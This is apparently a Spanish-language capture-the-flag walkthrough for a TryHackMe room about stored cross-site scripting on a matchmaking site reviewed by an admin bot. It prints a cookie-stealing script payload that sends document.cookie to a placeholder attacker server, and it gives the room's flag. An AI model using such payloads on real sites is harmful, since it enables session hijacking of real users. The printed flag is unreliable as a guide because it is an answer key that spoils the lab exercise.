# Cupid's Matchmaker

| **Dificultad** | Easy |
| **Tipo** | CTF |
| **Slug** | `lafb2026e3` |
| **Link** | [TryHackMe](https://tryhackme.com/room/lafb2026e3) |
| **Sección** | 01 Level Easy |
| **Fuente** | Web (API THM `api/v2/rooms/tasks?roomCode=lafb2026e3` + websearch de walkthroughs) |
| **Componentes** | Cross-Site Scripting almacenado (XSS stored) / exfiltración de cookies / Burp Collaborator / nc / web de matchmaking |
| **Impacto** | Explota un XSS almacenado en una web de emparejamiento para ejecutar un payload en la sesión del bot/admin y robar la cookie o leer el panel donde aparece la flag. |

---

**Contexto:** Sala de evento (Love at First Breach 2026) de dificultad Fácil. El tema es **Cross-Site Scripting almacenado (XSS stored)** en una web de emparejamiento: el mensaje de "interés" o perfil que envías se renderiza sin escapar en el panel que revisa un bot/administrador. El payload se ejecuta en la sesión del revisor y permite robar la cookie del admin o leer el panel donde aparece la flag.

## Solucionario

### Task 1: Admin Review

**Explicación:** La web de *matchmaking* permite dejar un mensaje en el perfil/candidatura (un campo que se renderiza sin sanitizar). Se inyecta un payload clásico de `script` (por ejemplo `<script>fetch('https://tu-servidor/?c='+document.cookie)</script>`). Un bot de revisión (o el admin) visita la página con la sesión privilegiada: el payload se ejecuta en ese contexto. En el panel del admin (visible tras el robo de cookie/sesión del bot, o directamente en la respuesta tras la revisión) está la flag: `THM{XSS_CuP1d_Str1k3s_Ag41n}`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? | `THM{XSS_CuP1d_Str1k3s_Ag41n}` |

---

**Metodología:**
1. **Reconocimiento:** web de emparejamiento con un campo de mensaje/perfil; se comprueba que la entrada se refleja sin `htmlspecialchars`/escapado al renderizarla.
2. **Detección de XSS:** `curl` enviando `<script>alert(1)</script>` y ver la reflexión en crudo en el HTML de la página del perfil/candidatura.
3. **Payload de exfiltración:** se sustituye por un payload que hace `fetch('https://tu-servidor/?c='+document.cookie)` a un listener propio (Burp Collaborator o `nc`); queda **almacenado** en la web.
4. **Revisión del admin:** el bot/admin revisa la candidatura; al cargarla ejecuta el script con la sesión privilegiada y envía la cookie (o la flag aparece en el panel del admin).
5. **Flag:** con la sesión/cookie del admin se accede al panel y se lee `THM{XSS_CuP1d_Str1k3s_Ag41n}`.

**Learning chain:** web de emparejamiento → campo de mensaje sin sanitizar → inyectar `<script>fetch(...document.cookie)</script>` [XSS stored] → bot/admin revisa con sesión privilegiada → payload se ejecuta → cookie/sesión exfiltrada (o panel admin) → flag.

**MITRE ATT&CK:** T1189 (Drive-by Compromise), T1059.007 (Command and Scripting Interpreter: JavaScript), T1041 (Exfiltration Over C2 Channel).

**Fuente:** [TryHackMe - Cupid's Matchmaker](https://tryhackme.com/room/lafb2026e3)